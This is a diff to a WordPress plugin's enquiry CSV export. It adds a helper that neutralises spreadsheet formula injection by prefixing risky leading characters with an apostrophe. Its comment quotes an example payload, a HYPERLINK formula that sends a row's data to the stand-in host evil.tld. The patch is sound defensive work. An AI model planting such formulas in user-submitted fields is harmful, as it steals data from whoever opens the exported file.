@@ -518,7 +518,7 @@ class Acreage_Core_Enquiries {
 		foreach ( $rows as $row ) {
 			$listing = (int) get_post_meta( $row->ID, '_acreage_enq_listing', true );
 
-			fputcsv( $out, array(
+			fputcsv( $out, array_map( array( $this, 'csv_cell' ), array(
 				get_the_date( 'Y-m-d H:i', $row ),
 				get_post_meta( $row->ID, '_acreage_enq_name', true ),
 				get_post_meta( $row->ID, '_acreage_enq_email', true ),
@@ -529,11 +529,46 @@ class Acreage_Core_Enquiries {
 				$row->post_content,
 				'1' === get_post_meta( $row->ID, self::SENT, true ) ? 'yes' : 'no',
 				'1' === get_post_meta( $row->ID, self::READ, true ) ? 'yes' : 'no',
-			) );
+			) ) );
 		}
 
 		fclose( $out );
 		exit;
+	}
+
+	/**
+	 * One CSV cell, neutralised so a spreadsheet reads it rather than runs it.
+	 *
+	 * Every interesting column here was typed by an anonymous visitor into the
+	 * enquiry form. sanitize_text_field() made those values safe for HTML; it
+	 * says nothing about a spreadsheet, which has its own idea of what a cell
+	 * beginning "=" means. Excel and LibreOffice both treat =, +, - and @ as
+	 * the start of a formula, so a name of
+	 *
+	 *     =HYPERLINK("http://evil.tld/?x="&A1,"Click")
+	 *
+	 * is a link that exfiltrates the row beside it, executing on the machine of
+	 * the one person guaranteed to open this file: the site owner. Tab and
+	 * carriage return get the same treatment because a leading one lets the
+	 * trigger character through behind it.
+	 *
+	 * The fix is the apostrophe, which is how a spreadsheet has always been
+	 * told "this is text". It is consumed on open and never becomes part of the
+	 * value. The cost is that a phone number written +27 82 441 7118 is stored
+	 * with one, since a leading + is exactly what we are guarding against and
+	 * there is no way to tell the two apart.
+	 *
+	 * @param mixed $value Cell value.
+	 * @return string
+	 */
+	private function csv_cell( $value ) {
+		$value = (string) $value;
+
+		if ( '' !== $value && strpos( "=+-@\t\r", $value[0] ) !== false ) {
+			return "'" . $value;
+		}
+
+		return $value;
 	}
 
 	/* -------------------------------------------------------------- the menu */
